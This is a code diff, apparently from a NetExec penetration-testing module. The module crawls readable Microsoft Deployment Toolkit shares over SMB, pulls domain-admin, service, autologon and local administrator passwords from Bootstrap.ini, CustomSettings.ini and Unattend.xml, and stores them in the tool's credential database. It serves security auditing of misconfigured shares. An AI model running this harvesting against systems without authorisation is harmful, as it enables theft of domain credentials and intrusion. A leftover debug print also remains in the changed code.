@@ -2,7 +2,7 @@ import re
 import os
 from os.path import join
 from io import BytesIO
-from nxc.helpers.misc import CATEGORY
+from nxc.helpers.misc import CATEGORY, decode_text
 from nxc.helpers.path import sanitize_path_component
 from nxc.paths import NXC_PATH
 
@@ -237,10 +237,12 @@ class NXCModule:
                         self.context.log.success(f"Saved WinPE: {path}\\{entry.get_longname()}")
                     except Exception as e:
                         self.context.log.fail(f"Failed to download {path}\\{entry.get_longname()}: {e}")
+                else:
+                    self.context.log.fail(f"Skipping {path}\\{entry.get_longname()} (size exceeds {WIM_MAX_SIZE / (1024 * 1024 * 1024):.1f} GB)")
 
         if extract_files:
             self.context.log.display("You need to manually extract the image to try gathering credentials (use 7zip or wimlib-imagex).")
-            self.context.log.display(r"Check out the paths: 'Deploy\Scripts\Bootstrap.ini' and 'Deploy\Scripts\CustomSettings.ini'")
+            self.context.log.display("Check out the paths: 'Deploy\\Scripts\\Bootstrap.ini' and 'Deploy\\Scripts\\CustomSettings.ini'")
 
     def explore_mdt(self, share):
         """
@@ -249,139 +251,106 @@ class NXCModule:
         If we can list it, it's either intentional access or a misconfiguration worth noting.
         """
         self.context.log.success(f"Found share: {share} (standard user access)")
+        cred_paths = [
+            "\\Control\\Bootstrap.ini",
+            "\\Control\\CustomSettings.ini",
+        ]
         # Probe access silently - failure is expected on hardened configs
         try:
-            # print(self.connection.conn.listPath(share, "\\*"))
-            pass
-        except Exception:
-            self.context.log.debug(f"{share} found but not readable (expected for protected MDT share)")
+            print(share)
+            self.connection.conn.listPath(share, "*")
+        except Exception as e:
+            self.context.log.fail(f"Failed to list {share} (expected for hardened MDT share): {e}")
             return
 
+        # Crawl for Unattend.xml files
+        cred_paths.extend(self.connection.spider(share, folder="Control", pattern=["Unattend.xml"]))
 
-def _parse_creds(hits):
-    """
-    Reconstruct (username, password, domain) tuples from raw key=value hits.
-    Handles both INI-style pairs and XML-structured blocks (AutoLogon, Credentials).
-    Returns a list of dicts ready for context.db.add_credential().
-    """
-    kv = {}
-    for hit in hits:
-        if "=" in hit:
-            key, _, val = hit.partition("=")
-            kv[key.strip()] = val.strip()
+        for path in cred_paths:
+            try:
+                buf = BytesIO()
+                self.connection.conn.getFile(share, path, buf.write)
+                hits = _cred_scan(decode_text(buf.getvalue()))
+                if hits:
+                    self.context.log.success(f"Credentials found in {path}")
+                    for hit in hits:
+                        self.context.log.highlight(f"  {hit}")
 
-    credentials = []
+                    # Push reconstructed credential pairs into the NXC database
+                    for cred in self.parse_creds(hits):
+                        try:
+                            self.context.db.add_credential(
+                                "plaintext",
+                                cred["domain"],
+                                cred["username"],
+                                cred["password"],
+                            )
+                            self.context.log.debug(f"Credential added to db: {cred['domain']}\\{cred['username']}")
+                        except Exception as e:
+                            self.context.log.debug(f"db.add_credential failed: {e}")
+                else:
+                    self.context.log.debug(f"No credentials found in {path}")
 
-    # Domain admin account from CustomSettings.ini
-    if "DomainAdmin" in kv and "DomainAdminPassword" in kv:
-        credentials.append({
-            "username": kv["DomainAdmin"],
-            "password": kv["DomainAdminPassword"],
-            "domain": kv.get("DomainAdminDomain") or kv.get("JoinDomain", ""),
-        })
+                if self.download:
+                    local_path = os.path.join(self.output_path, sanitize_path_component(f"{self.connection.hostname}_{os.path.basename(path)}"))
+                    with open(local_path, "wb") as fh:
+                        self.connection.conn.getFile(share, path, fh.write)
+                    self.context.log.success(f"Saved: {local_path}")
+            except Exception as e:
+                self.context.log.fail(f"Failed to read {share} (expected for protected MDT share): {e}")
 
-    # Service account from Bootstrap.ini
-    if "UserID" in kv and "UserPassword" in kv:
-        credentials.append({
-            "username": kv["UserID"],
-            "password": kv["UserPassword"],
-            "domain": kv.get("UserDomain", ""),
-        })
+    def parse_creds(self, hits):
+        """
+        Reconstruct (username, password, domain) tuples from raw key=value hits.
+        Handles both INI-style pairs and XML-structured blocks (AutoLogon, Credentials).
+        Returns a list of dicts ready for context.db.add_credential().
+        """
+        kv = {}
+        for hit in hits:
+            if "=" in hit:
+                key, _, val = hit.partition("=")
+                kv[key.strip()] = val.strip()
 
-    # Domain join account from Unattend.xml Credentials block
-    if "Credentials.Username" in kv and "Credentials.Password" in kv:
-        credentials.append({
-            "username": kv["Credentials.Username"],
-            "password": kv["Credentials.Password"],
-            "domain": kv.get("Credentials.Domain", ""),
-        })
+        credentials = []
 
-    # AutoLogon account from Unattend.xml
-    if "AutoLogon.Username" in kv and "AutoLogon.Password" in kv:
-        credentials.append({
-            "username": kv["AutoLogon.Username"],
-            "password": kv["AutoLogon.Password"],
-            "domain": "",  # AutoLogon is typically a local account
-        })
+        # Domain admin account from CustomSettings.ini
+        if "DomainAdmin" in kv and "DomainAdminPassword" in kv:
+            credentials.append({
+                "username": kv["DomainAdmin"],
+                "password": kv["DomainAdminPassword"],
+                "domain": kv.get("DomainAdminDomain") or kv.get("JoinDomain", ""),
+            })
 
-    # Local administrator password from the Unattend.xml
-    if "AdministratorPassword" in kv:
-        credentials.append({
-            "username": "Administrator",
-            "password": kv["AdministratorPassword"],
-            "domain": "",
-        })
+        # Service account from Bootstrap.ini
+        if "UserID" in kv and "UserPassword" in kv:
+            credentials.append({
+                "username": kv["UserID"],
+                "password": kv["UserPassword"],
+                "domain": kv.get("UserDomain", ""),
+            })
 
-    return credentials
+        # Domain join account from Unattend.xml Credentials block
+        if "Credentials.Username" in kv and "Credentials.Password" in kv:
+            credentials.append({
+                "username": kv["Credentials.Username"],
+                "password": kv["Credentials.Password"],
+                "domain": kv.get("Credentials.Domain", ""),
+            })
 
+        # AutoLogon account from Unattend.xml
+        if "AutoLogon.Username" in kv and "AutoLogon.Password" in kv:
+            credentials.append({
+                "username": kv["AutoLogon.Username"],
+                "password": kv["AutoLogon.Password"],
+                "domain": "",  # AutoLogon is typically a local account
+            })
 
-def _walk_share(connection, share, path=""):
-    """
-    Recursively yield (remote_path, file_size) for sensitive files in *share*.
+        # Local administrator password from the Unattend.xml
+        if "AdministratorPassword" in kv:
+            credentials.append({
+                "username": "Administrator",
+                "password": kv["AdministratorPassword"],
+                "domain": "",
+            })
 
-    Impacket quirks:
-      - Root listing expects an empty string, not "/"
-      - Paths use backslashes, no leading separator
-      - File metadata via .get_longname(), .is_directory(), .get_filesize()
-    """
-    try:
-        entries = connection.conn.listPath(share, (path or "") + "\\*")
-    except Exception:
-        return
-
-    for entry in entries:
-        name = entry.get_longname()
-        if name in (".", ".."):
-            continue
-
-        full = (path + "\\" + name).lstrip("\\")
-
-        if entry.is_directory():
-            yield from _walk_share(connection, share, full)
-            continue
-
-        if any(p.search(name) for p in SENSITIVE_REGEXES) or WIM_REGEX.search(name):
-            yield full, entry.get_filesize()
-
-
-def _decode(raw: bytes) -> str:
-    """Decode raw bytes with BOM detection and multi-encoding fallback."""
-    if not raw:
-        return ""
-    if raw.startswith(b"\xef\xbb\xbf"):
-        return raw.decode("utf-8-sig", errors="ignore")
-    if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
-        return raw.decode("utf-16", errors="ignore")
-    if raw.count(b"\x00") > len(raw) * 0.1:
-        try:
-            return raw.decode("utf-16-le", errors="ignore")
-        except Exception:
-            pass
-    for enc in ("utf-8", "latin-1"):
-        try:
-            return raw.decode(enc, errors="ignore")
-        except Exception:
-            continue
-    return ""
-
-
-def _download(context, connection, share, remote_path, local_dir) -> str | None:
-    """Download *remote_path* from *share* and prefix the filename with the server identifier."""
-    try:
-        os.makedirs(local_dir, exist_ok=True)
-        # Best-effort server name: NetBIOS name > hostname attribute > IP
-        hostname = (
-            getattr(connection, "remoteName", None)
-            or getattr(connection, "hostname", None)
-            or connection.host
-        )
-        # remote_path arrives as \Dir\file.ext - strip leading separators before splitting
-        clean = remote_path.strip("\\").strip("/")
-        basename = clean.replace("/", "\\").split("\\")[-1]
-        local_path = os.path.join(local_dir, f"{hostname}_{basename}")
-        with open(local_path, "wb") as fh:
-            connection.conn.getFile(share, remote_path, fh.write)
-        return local_path
-    except Exception as e:
-        context.log.debug(f"Download failed ({remote_path}): {e}")
-        return None
+        return credentials
